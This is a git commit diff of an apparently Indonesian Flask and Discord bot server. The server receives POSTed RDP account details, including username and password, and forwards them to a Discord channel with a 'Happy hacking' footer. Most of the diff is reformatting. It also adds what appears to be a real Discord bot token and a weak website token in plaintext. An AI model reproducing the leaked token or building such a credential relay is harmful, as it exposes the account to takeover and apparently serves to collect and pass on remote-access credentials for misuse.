5b40fa90a1ba0e8a3c9c8bb0f68ef66b23269975
adiyahoo <136817243+adiyahoo@users.noreply.github.com>
2023-06-26 10:13:37 +0700

    Update host.py

--- host.py
+++ host.py
@@ -12,17 +12,19 @@ from waitress import serve
 host = "0.0.0.0"
 port = 80
 
-token_discord_bot = ""
-token_website = ""
+token_discord_bot = (
+    "MTExOTg1MDI1MjUzMTQwMDgwNA.GJRBgz.B5wzaSQrQ4pCd34GW6qd2iRAcCEPCi3MGvQjjg"
+)
+token_website = "adiyahoo"
 
 channel_id_kirim_data_ori = 1119851938767442020
 channel_log = 1120302555382169660
 pesan_log = True
 
 app = Flask(__name__)
-app.env = 'production'
+app.env = "production"
 api = Api(app)
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
 
 ip_counter = defaultdict(int)
 ip_lock = defaultdict(threading.Lock)
@@ -30,7 +32,9 @@ ip_lock = defaultdict(threading.Lock)
 activities = [
     discord.Activity(type=discord.ActivityType.watching, name="Cracking the Code"),
     discord.Activity(type=discord.ActivityType.watching, name="github.com/adiyahoo"),
-    discord.Activity(type=discord.ActivityType.watching, name="instagram.com/adi_yaksa_nvm")
+    discord.Activity(
+        type=discord.ActivityType.watching, name="instagram.com/adi_yaksa_nvm"
+    ),
 ]
 
 
@@ -45,18 +49,24 @@ async def on_ready():
     await bot.loop.create_task(change_activity())
 
 
-class PesanDiscord():
+class PesanDiscord:
     @staticmethod
     async def masalah_1(channel_log_obj, ip):
-        await channel_log_obj.send(f"Siapa nih yang nyoba nge-hack websitenya? BTW, ini IP-nya, cekidot: ```{ip}```")
+        await channel_log_obj.send(
+            f"Siapa nih yang nyoba nge-hack websitenya? BTW, ini IP-nya, cekidot: ```{ip}```"
+        )
 
     @staticmethod
     async def masalah_2(channel_log_obj, error):
-        await channel_log_obj.send(f"Terjadi kesalahan dengan kode, informasi error: ```{error}```")
+        await channel_log_obj.send(
+            f"Terjadi kesalahan dengan kode, informasi error: ```{error}```"
+        )
 
     @staticmethod
     async def masalah_3(channel_log_obj, ip):
-        await channel_log_obj.send(f"Ada user mencoba melakukan post data tanpa token: ```{ip}```")
+        await channel_log_obj.send(
+            f"Ada user mencoba melakukan post data tanpa token: ```{ip}```"
+        )
 
     @staticmethod
     async def masalah_4(channel_log_obj, ip):
@@ -67,26 +77,31 @@ class PesanDiscord():
         guild = channel.guild
         owner = guild.owner
         embed = discord.Embed(title="Informasi Akun RDP", color=discord.Color.red())
-        embed.add_field(name="💻 Sistem Operasi", value=data['os'], inline=False)
-        embed.add_field(name="🌐 IP Address", value=data['ip'], inline=False)
-        embed.add_field(name="👤 Username", value=data['username'], inline=False)
-        embed.add_field(name="🔒 Password", value=data['password'], inline=False)
-        embed.add_field(name="🌍 Country", value=data['country'], inline=False)
+        embed.add_field(name="💻 Sistem Operasi", value=data["os"], inline=False)
+        embed.add_field(name="🌐 IP Address", value=data["ip"], inline=False)
+        embed.add_field(name="👤 Username", value=data["username"], inline=False)
+        embed.add_field(name="🔒 Password", value=data["password"], inline=False)
+        embed.add_field(name="🌍 Country", value=data["country"], inline=False)
         embed.set_footer(text="Stay curious and keep exploring. Happy hacking! 😄")
         info_message = f"Info akun RDP, bro! {owner.mention}"
         await channel.send(content=info_message, embed=embed)
 
 
-class BotDiscord():
+class BotDiscord:
     @staticmethod
     def bot_kirim_pesan(data):
         channel = bot.get_channel(channel_id_kirim_data_ori)
         if channel is not None:
-            asyncio.run_coroutine_threadsafe(PesanDiscord.send_embed(channel, data), bot.loop)
+            asyncio.run_coroutine_threadsafe(
+                PesanDiscord.send_embed(channel, data), bot.loop
+            )
             return True
         else:
             print(f"Channel dengan ID {channel_id_kirim_data_ori} tidak ditemukan.")
-            return f"Channel dengan ID {channel_id_kirim_data_ori} tidak ditemukan.", 404
+            return (
+                f"Channel dengan ID {channel_id_kirim_data_ori} tidak ditemukan.",
+                404,
+            )
 
     @staticmethod
     def bot_kirim_log(ip, error, masalah):
@@ -95,13 +110,21 @@ class BotDiscord():
             if pesan_log:
                 match masalah:
                     case 1:
-                        asyncio.run_coroutine_threadsafe(PesanDiscord.masalah_1(channel_log_obj, ip), bot.loop)
+                        asyncio.run_coroutine_threadsafe(
+                            PesanDiscord.masalah_1(channel_log_obj, ip), bot.loop
+                        )
                     case 2:
-                        asyncio.run_coroutine_threadsafe(PesanDiscord.masalah_2(channel_log_obj, error), bot.loop)
+                        asyncio.run_coroutine_threadsafe(
+                            PesanDiscord.masalah_2(channel_log_obj, error), bot.loop
+                        )
                     case 3:
-                        asyncio.run_coroutine_threadsafe(PesanDiscord.masalah_3(channel_log_obj, ip), bot.loop)
+                        asyncio.run_coroutine_threadsafe(
+                            PesanDiscord.masalah_3(channel_log_obj, ip), bot.loop
+                        )
                     case 4:
-                        asyncio.run_coroutine_threadsafe(PesanDiscord.masalah_4(channel_log_obj, ip), bot.loop)
+                        asyncio.run_coroutine_threadsafe(
+                            PesanDiscord.masalah_4(channel_log_obj, ip), bot.loop
+                        )
             else:
                 pass
         else:
@@ -111,7 +134,7 @@ class BotDiscord():
 
 class Author(Resource):
     def get(self):
-        html = '''
+        html = """
             <html>
             <head>
                 <title>Author Code</title>
@@ -154,44 +177,44 @@ class Author(Resource):
                 <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
             </body>
             </html>
-            '''
+            """
         response = make_response(html)
-        response.headers['Content-Type'] = 'text/html'
+        response.headers["Content-Type"] = "text/html"
 
         return response
 
 
 class GetData(Resource):
     def post(self):
-        ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
+        ip = request.environ.get("HTTP_X_REAL_IP", request.remote_addr)
         try:
             data = request.get_json()
-            if data['token'] == token_website:
+            if data["token"] == token_website:
                 with ip_lock[ip]:
                     ip_counter[ip] += 1
                     if ip_counter[ip] <= 2:
                         check_pesan = BotDiscord.bot_kirim_pesan(data)
                         if check_pesan:
-                            return 'Berhasil', 200
+                            return "Berhasil", 200
                     else:
                         BotDiscord.bot_kirim_log(ip, None, 4)
-                        return 'Limit tercapai mau ngespam?', 403
+                        return "Limit tercapai mau ngespam?", 403
             else:
                 BotDiscord.bot_kirim_log(ip, None, 1)
-                return 'Token anda salah', 401
+                return "Token anda salah", 401
         except KeyError as e:
             BotDiscord.bot_kirim_log(ip, None, 3)
-            return f'Terjadi kesalahan, pesan: {e}', 500
+            return f"Terjadi kesalahan, pesan: {e}", 500
         except Exception as e:
             BotDiscord.bot_kirim_log(None, e, 2)
-            return f'Terjadi kesalahan, pesan: {e}', 500
+            return f"Terjadi kesalahan, pesan: {e}", 500
 
 
-api.add_resource(Author, '/')
-api.add_resource(GetData, '/post_data')
+api.add_resource(Author, "/")
+api.add_resource(GetData, "/post_data")
 
 
-class RunApp():
+class RunApp:
     @staticmethod
     def run_flask():
         serve(app, host=host, port=port)
